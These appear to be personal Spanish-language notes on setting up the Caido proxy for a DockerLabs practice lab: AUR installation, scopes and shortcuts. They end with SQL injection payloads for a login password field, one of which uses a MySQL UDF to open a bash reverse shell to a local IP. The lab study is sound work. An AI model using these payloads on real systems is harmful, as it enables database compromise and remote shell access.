<https://docs.caido.io/quickstart/beginner_guide/setup/linux>

```bash
AUR (Arch User Repository)

DANGER

Using an unofficial repository to install Caido may expose you to potential security risks. The installation is managed by third-party maintainers, not the official Caido team, which means it may not be as regularly updated or audited.

To download the Caido desktop application for Arch Linux and Arch-based distributions, first ensure you have the required dependencies installed:

sudo pacman -S --needed git base-devel fuse2

    Next, clone the package from the AUR:

cd $(mktemp -d)
git clone https://aur.archlinux.org/caido-desktop.git --depth 1 --verbose --progress --ipv4

Change into the cloned directory:

cd ./caido-desktop
makepkg -si --noconfirm
```

Caido setea el proxy por el equipo local y el puerto 8080

Le podemos dar a new instance para crear una nueva instancia de caido

le damos a "Start" y se nos abrirá una ventana de caido
podemos quitar la ventana anterior

nos pediria logearnos o entrar como invitado pues le damos a "Continue as Guest"
luego le daremos crear un nuevo proyecto

para mayor personalizacion le daremos a Scopes
crearemos un nuevo scope dandole New Preset

Le ponemos un nombre ejemplo

Container Backend - DockerLabs

In Scope: son los hosts o dominios que Caido va a monitorear o mostrar en pestañas como Sitemap, Intercept, HTTP/WS History y Search. Por ejemplo, si marcas *.miweb.com o 172.17.0.2 como "In Scope", todas las peticiones a ese dominio se incluirán

Out of Scope: son hosts excluidos, es decir, aunque Caido pueda detectarlos, no los mostrará en las vistas activas. Útil si un subdominio no es relevante y deseas ocultarlo, por ejemplo, *.docs.miweb.com .

luego le damos a Save

<https://addons.mozilla.org/en-US/firefox/addon/foxyproxy-standard/>

ctrl + r -> repeter en caido se llama replay
ctrl + m -> intruder -> el automate en cadi
Web Interface <port>

---

malo

Payload que puse en el campo password
' UNION SELECT NULL,NULL,DATABASE(); system echo '' >/dev/tcp/192.168.1.13/5757 #

como ser veria
SELECT * FROM usuarios WHERE username='$username' AND password='' UNION SELECT NULL,NULL,DATABASE(); system echo '' >/dev/tcp/192.168.1.13/5757 #

' UNION SELECT NULL,NULL,DATABASE(); DROP FUNCTION IF EXISTS sys_exec; CREATE FUNCTION sys_exec RETURNS INT SONAME 'lib_mysqludf_sys.so'; SELECT sys_exec('bash -i >& /dev/tcp/192.168.1.13/5757 0>&1');
